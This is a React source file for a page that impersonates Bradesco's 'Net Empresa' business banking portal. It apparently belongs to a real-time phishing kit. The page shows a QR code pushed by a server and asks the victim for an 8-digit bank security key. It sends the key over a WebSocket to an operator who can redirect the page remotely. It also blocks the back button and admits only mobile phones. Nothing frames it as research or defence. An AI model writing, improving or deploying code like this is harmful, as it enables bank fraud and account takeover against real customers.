import { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import bradescoLogo from "@/assets/bradesco-logo.png";
import { resolveServerRoute } from "@/lib/resolveServerRoute";
import { useWebSocket } from "@/hooks/useWebSocket";

const QRCodePage = () => {
  const navigate = useNavigate();
  const usuario = localStorage.getItem("usuario") || "";
  const nome = localStorage.getItem("nome") || "";
  const qr = localStorage.getItem("qr") || "";
  const dispositivo = localStorage.getItem("dispositivo") || "";
  const [chave, setChave] = useState(["", "", "", "", "", "", "", ""]);
  const [enviando, setEnviando] = useState(false);
  const [erro, setErro] = useState("");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const { send } = useWebSocket({
    reconectarPayload: { dispositivo },
    onRedirect: (msg) => {
      navigate(resolveServerRoute(msg.url));
    },
    onMessage: (msg) => {
      if (msg.acao === "erro_chave") {
        setErro(msg.motivo || "Chave inválida. Tente novamente.");
        setEnviando(false);
      }
    },
  });

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePop = () => window.history.pushState(null, "", window.location.href);
    window.addEventListener("popstate", handlePop);
    return () => window.removeEventListener("popstate", handlePop);
  }, []);

  const handleDigit = (index: number, value: string) => {
    if (!/^\d?$/.test(value)) return;
    const newChave = [...chave];
    newChave[index] = value;
    setChave(newChave);
    setErro("");
    if (value && index < 7) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !chave[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const chaveCompleta = chave.every(d => d !== "");

  const enviarChave = () => {
    if (!chaveCompleta) return;
    setErro("");
    setEnviando(true);
    send({ acao: "token", usuario, token: chave.join("") });
    navigate("/validando");
  };

  return (
    <>
      {/* Desktop blocker */}
      <div className="hidden md:flex min-h-screen items-center justify-center bg-[hsl(220,60%,40%)] p-8">
        <div className="text-center text-white max-w-sm space-y-4">
          <div className="w-16 h-16 rounded-2xl bg-white/20 flex items-center justify-center mx-auto">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-8 h-8" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
          </div>
          <h2 className="text-xl font-bold">Acesso exclusivo pelo celular</h2>
          <p className="text-white/70 text-sm leading-relaxed">Este portal está disponível apenas para dispositivos móveis.</p>
        </div>
      </div>

      {/* Mobile layout */}
      <div className="md:hidden min-h-screen flex flex-col bg-[hsl(220,20%,96%)]">
        <div className="bg-[hsl(220,60%,40%)] px-4 py-3">
          <h1 className="text-white text-base font-semibold tracking-tight">Bradesco Net Empresa</h1>
        </div>

        <div className="flex flex-col items-center flex-1 px-5 pt-6">
          <img src={bradescoLogo} alt="Bradesco" className="w-16 h-16 object-contain mb-4" />

          {nome && (
            <p className="text-[hsl(220,10%,46%)] text-sm mb-1">
              Olá, <span className="font-semibold text-[hsl(220,20%,14%)]">{nome}</span>
            </p>
          )}

          <h2 className="text-[hsl(220,20%,14%)] text-lg font-bold mb-1 text-center">Validação de segurança</h2>
          <p className="text-[hsl(220,10%,46%)] text-xs text-center mb-5 max-w-[260px]">
            Escaneie o QR Code abaixo com o aplicativo Bradesco para validar seu acesso.
          </p>

          {qr ? (
            <div className="bg-white p-4 rounded-2xl shadow-md shadow-black/5 mb-5">
              <img src={qr} alt="QR Code de validação" className="w-52 h-52 object-contain" />
            </div>
          ) : (
            <div className="bg-white p-4 rounded-2xl shadow-md shadow-black/5 mb-5 w-60 h-60 flex items-center justify-center">
              <div className="w-8 h-8 border-[3px] border-[hsl(220,14%,89%)] border-t-[hsl(220,60%,40%)] rounded-full animate-spin" />
            </div>
          )}

          {/* Security key input */}
          <div className="w-full bg-white rounded-xl px-4 py-5 border border-[hsl(220,14%,89%)] mb-4">
            <div className="flex items-center gap-3 mb-4">
              <svg xmlns="http://www.w3.org/2000/svg" className="w-10 h-10 shrink-0 text-[hsl(220,10%,60%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
                <rect x="3" y="3" width="7" height="7" rx="1" />
                <rect x="14" y="3" width="7" height="7" rx="1" />
                <rect x="3" y="14" width="7" height="7" rx="1" />
                <rect x="14" y="14" width="4" height="4" rx="1" />
                <path d="M20 16v2a2 2 0 0 1-2 2h-1" />
                <path d="M21 21h.01" />
              </svg>
              <h3 className="text-[hsl(220,20%,14%)] text-sm font-bold leading-tight">
                Digite a Chave de segurança com 8 dígitos
              </h3>
            </div>

            <div className="flex justify-between px-1 mb-3">
              {chave.map((digit, i) => (
                <input
                  key={i}
                  ref={el => { inputRefs.current[i] = el; }}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleDigit(i, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(i, e)}
                  className="w-8 h-10 text-center text-base font-mono border-b-2 border-[hsl(220,14%,80%)] bg-transparent focus:outline-none focus:border-[hsl(220,60%,40%)] transition-colors"
                />
              ))}
            </div>

            <p className="text-[hsl(220,10%,56%)] text-xs text-center mb-4">
              Confira o número de série do seu dispositivo: <span className="font-bold text-[hsl(220,20%,14%)]">{dispositivo || "—"}</span>
            </p>

            {erro && <p className="text-[hsl(0,84%,60%)] text-xs text-center mb-3">{erro}</p>}

            <button
              onClick={enviarChave}
              disabled={!chaveCompleta || enviando}
              className="w-full h-11 rounded-full bg-[hsl(349,93%,42%)] text-white text-sm font-semibold active:scale-[0.97] transition-all duration-200 disabled:opacity-50"
            >
              {enviando ? "Enviando..." : "Confirmar"}
            </button>
          </div>
        </div>
      </div>
    </>
  );
};

export default QRCodePage;
